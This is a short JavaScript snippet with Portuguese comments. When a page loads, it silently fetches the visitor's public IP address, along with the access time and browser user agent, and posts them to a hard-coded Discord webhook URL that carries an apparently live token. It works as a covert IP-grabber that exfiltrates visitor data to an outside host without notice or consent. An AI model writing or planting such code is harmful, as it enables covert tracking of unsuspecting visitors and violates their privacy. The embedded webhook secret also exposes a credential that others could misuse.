async function sendWebhook() {
    // Obter IP do usuário
    let response = await fetch('https://api.ipify.org?format=json');
    let data = await response.json();
    let ip = data.ip;

    // Obter horário atual
    let now = new Date().toISOString();

    // Obter User-Agent
    let userAgent = navigator.userAgent;

    // Montar payload do webhook
    let webhookData = {
        content: "New visitor info",
        embeds: [{
            title: "Visitor Information",
            fields: [
                { name: "IP Address", value: ip },
                { name: "Access Time", value: now },
                { name: "User Agent", value: userAgent }
            ]
        }]
    };

    // URL do webhook do Discord
    let webhookUrl = 'https://discord.com/api/webhooks/1242618292519047209/PqsrXp8KkObweAfeUAjDoM_P6HSzJu3vlXv7W3tunMhmsM53pz7SK0HC54M_Fsbra_-Q';

    // Enviar dados para o webhook do Discord
    fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(webhookData)
    });
}

window.onload = sendWebhook;